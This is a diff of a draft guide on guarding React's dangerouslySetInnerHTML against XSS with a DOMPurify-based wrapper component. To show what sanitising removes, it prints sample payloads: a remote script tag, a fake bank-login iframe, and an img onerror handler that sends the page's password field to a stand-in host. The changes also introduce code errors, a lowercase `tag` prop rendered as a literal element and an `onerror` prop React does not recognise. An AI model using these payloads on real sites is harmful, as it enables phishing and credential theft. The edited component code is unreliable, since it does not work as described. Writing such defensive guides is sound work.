@@ -15,20 +15,20 @@ status: draft
 
 The following component serves as a simple example of mitigating the risk of an XSS attack via dangerouslySetInnerHTML:
 
-```jsx
+```jsx title="DangerousHtml.jsx"
 //https://github.com/cure53/DOMPurify
 import React from "react";
 import DOMPurify from "dompurify";
 
 const sanitize = (dirty) => DOMPurify.sanitize(dirty);
 
-const DangerousHtml = ({ innerHTML, Tag }) => {
+const DangerousHtml = ({ innerHTML, tag }) => {
   const clean = sanitize(innerHTML);
 
-  if (typeof Tag === "undefined") {
+  if (typeof tag === "undefined") {
     return <div dangerouslySetInnerHTML={{ __html: clean }} />;
   }
-  return <Tag dangerouslySetInnerHTML={{ __html: clean }} />;
+  return <tag dangerouslySetInnerHTML={{ __html: clean }} />;
 };
 
 export default DangerousHtml;
@@ -36,131 +36,66 @@ export default DangerousHtml;
 
 By using our bespoke `DangerousHtml` component, we can dramatically reduce the risk of an XSS exploit as we're sanitising our input before it gets to the actual `dangerouslySetInnerHTML` prop
 
+`DOMPurify` is highly configurable too, so it might be the case that you want to have multiple components like our example to handle specific use cases or allow some of the below examples explicitly.
+
 Below are some brief examples of how the exploits could take place:
 
-## Script Tag
+## Exploiting iFrame and Script Tags
 
 XSS is possible as React will not strip out the script tag which points to a malicious payload.
 
-You can verify this be looking in the network tab of devtool for the (failed) HTTP request to `https://example.com/malicious-script-or-page`.
+We really shouldn't be passing iFrames in this way either. Rather, we should pass the URL and any other "safe" attributes as a props and render it ourselves in an iFrame tag to retain control of it's rendering ability's and source, or have a dedicated iFrame component.
 
-Using our DangerousHTML component instead, means that
-
-### Original
-
-```html
-<p>
-  Hi
-  <script src="https://example.com/malicious-script-or-page"></script>
-  Fiona
-</p>
-```
-
-### _dangerouslySetInnerHTML_
-
-This:
+For example, consider rhe following malicious markup that we've received from an API request. If we blindly set it via _dangerouslySetInnerHTML_, we'll give the user this output:
 
 ```jsx
+// Bad markup going in
 <div
   dangerouslySetInnerHTML={{
     __html: `<p>
   Hi
-  <script src="https://example.com/malicious-script-or-page"></script>
-  Fiona
+  <script src="https://example.com/malicious-tracking"></script>
+  Fiona, here is the link to enter your bank details:
+  <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
 </p>`,
   }}
 />
 ```
 
-Becomes:
-
 ```html
+<!-- Bad markup rendered on the DOM -->
 <div>
   <p>
     Hi
-    <script src="https://example.com/malicious-script-or-page"></script>
-    Fiona
+    <script src="https://example.com/malicious-tracking"></script>
+    Fiona, here is the link to enter your bank details:
+    <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
   </p>
 </div>
 ```
 
-### Sanitized _dangerouslySetInnerHTML_
-
-This:
+However, using our DangerousHTML component instead, means that we have mitigated most of the risk the user may have faced:
 
 ```jsx
-<DangerousHtml innerHTML={markup} />
-```
-
-Becomes:
-
-```jsx
-<div>
-  <p>Hi Fiona</p>
-</div>
-```
-
-## iFrames Tag
-
-We really shouldn't be passing iFrames in this way.
-
-Rather, we should pass the URL and any other "safe" attributes as a props and render it ourselves in an iFrame tag to retain control of it's rendering ability's and source, or have a dedicated iFrame component.
-
-### Original
-
-```html
-<p>
-  Hello
-  <iframe src="https://example.com/malicious-script-or-page"></iframe>
-  Dave
-</p>
-```
-
-### _dangerouslySetInnerHTML_
-
-This:
-
-```jsx
-<div
-  dangerouslySetInnerHTML={{
-    __html: `
-<p>
-  Hello
-  <iframe src='https://example.com/malicious-script-or-page'></iframe>
-  Dave
-</p>
-    `,
-  }}
+// Bad markup going in
+<DangerousHtml
+  innerHTML={`<p>
+  Hi
+  <script src="https://example.com/malicious-tracking"></script>
+  Fiona, here is the link to enter your bank details:
+  <iframe src="https://example.com/defo-not-the-actual-bank"></iframe>
+</p>`}
 />
 ```
 
-Becomes:
-
 ```html
+<!-- Clean markup rendered on the DOM -->
 <div>
-  <p>
-    Hello
-    <iframe src="https://example.com/malicious-script-or-page"></iframe>
-    Dave
-  </p>
+  <p>Hi Fiona, here is the link to enter your bank details:</p>
 </div>
 ```
 
-### Sanitized _dangerouslySetInnerHTML_
-
-This:
-
-```jsx
-<DangerousHtml innerHTML={markup} />
-```
-
-Becomes:
-
-```html
-<div>
-  <p>Hello Dave</p>
-</div>
-```
+Fiona may think that the website is broken or missing content for some reason - but this is still better than being phished for their bank details!
 
 ## Attribute manipulation/poisoning
 
@@ -168,23 +103,10 @@ Some DOM elements have special attributes that we can abuse that we should prote
 
 In this example, we can run some JS on an `<image>` tag's `onerror`.
 
-Similar to the above example, if we want to render an image we should pass the URL as a prop and explicitly render the image with its properties from the component props.
-
-### Original
-
-```html
-<p>
-  Hola
-  <img src="none.png" onerror='alert("Rainbow mode FTW!")' />
-  Sharon
-</p>
-```
-
-### _dangerouslySetInnerHTML_
-
-This:
+For example, given the following:
 
 ```jsx
+// Bad markup going in
 <div
   dangerouslySetInnerHTML={{
     __html: `
@@ -192,7 +114,7 @@ This:
   Hola
   <img
     src='none.png'
-    onerror='alert("Rainbow mode FTW!")'
+    onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
   />
   Sharon
 </p>`,
@@ -200,29 +122,41 @@ This:
 />
 ```
 
-Becomes:
-
 ```html
+<!-- Bad markup rendered on the DOM -->
 <div>
   <p>
     Hola
-    <img src="none.png" onerror='alert("Rainbow mode FTW!")' />
+    <img
+      src="none.png"
+      onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
+    />
     Sharon
   </p>
 </div>
 ```
 
-### Sanitized _dangerouslySetInnerHTML_
+In this instance, our poisoned markup is stealing data from the DOM when the image request eventually fails and the user will never even know.
 
-This:
+We can mitigate this again with our DangerousHtml component
 
 ```jsx
-<DangerousHtml innerHTML={markup} />
+// Bad markup going in
+<DangerousHtml
+  innerHTML={`
+<p>
+  Hola
+  <img
+    src='none.png'
+    onerror='fetch("https://example.com/malicious-tracking?password=" + document.querySelector("input#password").value);'
+  />
+  Sharon
+</p>`}
+/>
 ```
 
-Becomes:
-
-```jsx
+```html
+<!-- Clean markup rendered on the DOM -->
 <div>
   <p>
     Hola
@@ -232,11 +166,27 @@ Becomes:
 </div>
 ```
 
-Given the argument that we may genuinely want to execute some JS to show a fallback image, we should again not be trusting raw, unsanitized HTML to do this for us and would be better served either having a `fallbackImageURL` or `onError` prop that we can explicitly add to our image tag
+Given the argument that we may genuinely want to execute some JS to show a fallback image, we should again not be trusting raw, unsanitized HTML to do this for us and would be better served either having a `fallbackImageURL` or `onError` prop that we can explicitly add to our image tag like so:
 
-```html
-<img
-  src="invalid_link"
-  onerror="this.onerror=null; this.src='https://placeimg.com/200/300/animals'"
-/>
+```jsx
+// Usual imports
+const MyImageComponent = ({ fallbackUrl, url }) => {
+  // Usual component setup
+
+  const displayFallbackImage = (evt) => {
+    // If there is no fallback, do nothing
+    if (!fallbackUrl) return;
+
+    // set the url to the fallbackUrl
+    evt.target.src = fallbackUrl;
+  };
+
+  return (
+    <img
+      src={url}
+      onerror={displayFallbackImage}
+      // ... any other props
+    />
+  );
+};
 ```
